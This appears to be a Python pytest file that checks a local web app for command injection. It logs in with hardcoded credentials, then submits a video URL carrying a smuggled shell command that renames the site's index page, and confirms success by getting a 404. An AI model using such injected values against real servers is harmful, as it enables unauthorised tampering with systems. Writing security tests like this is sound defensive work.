import requests
import pytest
import os, os.path

def login():
    data = {'username': 'jimstark', 'password': 'password1'}
    try:
        page = requests.post("https://localhost/core/login/login.php",data=data, verify=False)
    except:
        page = None
    assert page != None
    assert '{"success": true}' in page.text
    return page.headers["Set-Cookie"][8:136]

def test_cmd_inject():
    try:
        page = requests.get("https://localhost/index.html", verify=False)
    except:
        page = None
    assert page.status_code == 200
    session = {"session": login()}
    data = {"title":"rekt","url": "https://127.0.0.1/exec.mp4; mv /var/www/html/index.html /var/www/html/index.rekt"}
    try:
        page = requests.post("https://localhost/core/video/downloadVideo.php",data=data, cookies=session, verify=False)
    except:
        page = None
    try:
        page = requests.get("https://localhost/index.html", verify=False)
    except:
        page = None
    assert page.status_code == 404
